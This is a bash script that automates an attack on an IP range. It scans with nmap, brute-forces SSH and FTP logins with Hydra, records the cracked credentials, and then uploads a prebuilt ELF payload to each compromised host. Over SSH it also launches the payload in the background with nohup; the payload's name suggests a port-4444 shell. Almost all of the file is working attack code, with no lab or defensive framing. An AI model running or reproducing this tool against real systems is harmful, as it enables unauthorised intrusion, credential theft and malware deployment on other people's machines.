#!/bin/bash

IP_RANGE=$1

# Ensure directories exist
mkdir -p nmap_scan
mkdir -p hydra_results
mkdir -p matching_credentials
mkdir -p scan_log

# Generate timestamp
Ephoc_Time=$(date +%s)
Timestamp=$(date +"%d-%b-%Y %H:%M:%S")
NMAP_SCAN="nmap_scan/${Ephoc_Time}_nmap.txt"
HYDRA_LOG="hydra_results/${Ephoc_Time}_hydra.txt"
MATCHING_CREDENTIALS="matching_credentials/${Ephoc_Time}_matching_credentials.txt"
SCAN_LOG="scan_log/${Ephoc_Time}_scan.log"
FTP_LOG="scan_log/${Ephoc_Time}_ftp_upload.log"

# Start log
echo -e "\033[1;34m[+] Starting Network Scan: $IP_RANGE\033[0m"
echo "===== Scan Report - $Timestamp (Epoch: $Ephoc_Time) =====" > "$SCAN_LOG"
echo "Target IP Range: $IP_RANGE" >> "$SCAN_LOG"
echo "--------------------------------------------------------" >> "$SCAN_LOG"

# Run nmap scan and save output
echo -e "\033[1;34m[+] Running Nmap Scan...\033[0m"
nmap $IP_RANGE --open -sV > "$NMAP_SCAN"
echo -e "\033[1;32m[+] Nmap scan completed!\033[0m"
echo "[*] Nmap scan completed. Results saved to: $NMAP_SCAN" >> "$SCAN_LOG"

# Extract IPs and services
IP_LIST=$(grep -i "Nmap scan report for" "$NMAP_SCAN" | awk '{print $5}')
PORT_INFO=$(awk '/Nmap scan report for/{ip=$5} /^[0-9]+\//{print ip, $1, $3}' "$NMAP_SCAN")

# Save results to files
echo "$PORT_INFO" >> "nmap_scan/${Ephoc_Time}_PORT_INFO"

# Append Nmap results to log
echo -e "\033[1;34m[+] Saving Nmap scan results...\033[0m"
echo "----- Nmap Scan Data -----" >> "$SCAN_LOG"
cat "$NMAP_SCAN" >> "$SCAN_LOG"
echo "--------------------------" >> "$SCAN_LOG"

# Start brute-force attack
echo -e "\033[1;34m[+] Starting Hydra Brute-Force Attack...\033[0m"
USER_LIST="users.txt"
PASS_LIST="pass.txt"

while read -r IP PORT SERVICE; do
    PORT=$(echo "$PORT" | cut -d'/' -f1)

    echo -e "\033[1;33m[*] Attempting Brute-Force on $SERVICE at $IP:$PORT...\033[0m"
    echo "Brute-forcing $SERVICE on $IP:$PORT..." >> "$SCAN_LOG"

    case $SERVICE in
        ssh)
            hydra -L $USER_LIST -P $PASS_LIST ssh://$IP -s $PORT -q -t 1 -W 2 -o "$HYDRA_LOG" | \
            grep -E "\[.*\] host: " | tee -a "$MATCHING_CREDENTIALS"

            if grep -q "\[ssh\] host: $IP" "$MATCHING_CREDENTIALS"; then
                USER=$(grep "\[ssh\] host: $IP" "$MATCHING_CREDENTIALS" | awk '{print $5}')
                PASS=$(grep "\[ssh\] host: $IP" "$MATCHING_CREDENTIALS" | awk '{print $7}')
                echo "[+] SSH Credentials Found: $USER:$PASS" >> "$SCAN_LOG"

                # Detect architecture via SSH
                ARCH=$(sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$IP" "uname -m")
                echo -e "\033[1;34m[*] Host Architecture: $ARCH\033[0m"
                echo "Host Architecture: $ARCH" >> "$SCAN_LOG"

                # Select appropriate payload
                if [[ "$ARCH" == *"x86_64"* ]]; then
                    PAYLOAD="payloads/payload_64_4444.elf"
                else
                    PAYLOAD="payloads/payload_32_4444.elf"
                fi
                echo -e "\033[1;34m[*] Payload Selected: $PAYLOAD\033[0m"
                echo "Payload Selected: $PAYLOAD" >> "$SCAN_LOG"

                # Upload payload
                sshpass -p "$PASS" scp -o StrictHostKeyChecking=no "$PAYLOAD" "$USER@$IP:~/"
                if [[ $? -eq 0 ]]; then
                    echo -e "\033[1;32m[+] Payload uploaded successfully!\033[0m"
                    echo "[+] Payload uploaded successfully." >> "$SCAN_LOG"
                    
                    # Execute payload on remote machine and wait for it to fully stage
					sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no "$USER@$IP" <<EOF
chmod +x ~/$(basename "$PAYLOAD")
nohup ~/$(basename "$PAYLOAD") > /dev/null 2>&1 &
sleep 5
counter=0
while ! pgrep -f $(basename "$PAYLOAD") > /dev/null; do
    echo -e "\033[1;33m[\${counter}] Waiting for payload to complete staging...\033[0m"
    sleep 3
    counter=\$((counter + 1))
    if [ "\$counter" -gt 10 ]; then
        echo -e "\033[1;31m[!] Error: Payload did not start after 30 seconds!\033[0m"
        exit 1
    fi
done
echo -e "\033[1;32m[+] Payload staged successfully!\033[0m"
EOF
                else
                    echo -e "\033[1;31m[!] Payload upload failed!\033[0m"
                    echo "[!] Payload upload failed." >> "$SCAN_LOG"
                fi
            fi
            ;;
        
        ftp)
            hydra -L $USER_LIST -P $PASS_LIST ftp://$IP -s $PORT -q -t 1 -W 2 -o "$HYDRA_LOG" | \
            grep -E "\[.*\] host: " | tee -a "$MATCHING_CREDENTIALS"

            if grep -q "\[ftp\] host: $IP" "$MATCHING_CREDENTIALS"; then
                USER=$(grep "\[ftp\] host: $IP" "$MATCHING_CREDENTIALS" | awk '{print $5}')
                PASS=$(grep "\[ftp\] host: $IP" "$MATCHING_CREDENTIALS" | awk '{print $7}')
                echo "[+] FTP Credentials Found: $USER:$PASS" >> "$SCAN_LOG"

                # Detect architecture via FTP `SYST` command
                ARCH=$(ftp -inv $IP <<EOF | grep "215"
user "$USER" "$PASS"
syst
bye
EOF
                )

                echo -e "\033[1;34m[*] Host Architecture: $ARCH\033[0m"
                echo "Host Architecture: $ARCH" >> "$SCAN_LOG"

                # Upload payload via FTP
                ftp -inv $IP <<EOF | tee "$FTP_LOG"
user "$USER" "$PASS"
cd ~/
put $PAYLOAD
bye
EOF

                if grep -q "550 Permission denied" "$FTP_LOG"; then
                    echo -e "\033[1;31m[!] FTP upload failed for $IP.\033[0m"
                    echo "[!] FTP upload failed for $IP." >> "$SCAN_LOG"
                else
                    echo -e "\033[1;32m[+] Payload uploaded successfully via FTP!\033[0m"
                    echo "[+] Payload uploaded successfully via FTP." >> "$SCAN_LOG"
                fi
            fi
            ;;
        
        *)
            echo -e "\033[1;31m[!] No brute-force module available for $SERVICE on $IP\033[0m"
            ;;
    esac
done <<< "$PORT_INFO"

# Append Hydra results and credentials to log
echo -e "\033[1;34m[+] Saving Hydra brute-force results...\033[0m"
echo "----- Hydra Brute-Force Results -----" >> "$SCAN_LOG"
cat "$HYDRA_LOG" >> "$SCAN_LOG"
echo "------------------------------------" >> "$SCAN_LOG"

echo -e "\033[1;34m[+] Saving matching credentials...\033[0m"
echo "----- Matching Credentials Found -----" >> "$SCAN_LOG"
cat "$MATCHING_CREDENTIALS" >> "$SCAN_LOG"
echo "--------------------------------------" >> "$SCAN_LOG"

echo -e "\033[1;32m[+] Scan completed! Log saved to: $SCAN_LOG\033[0m"
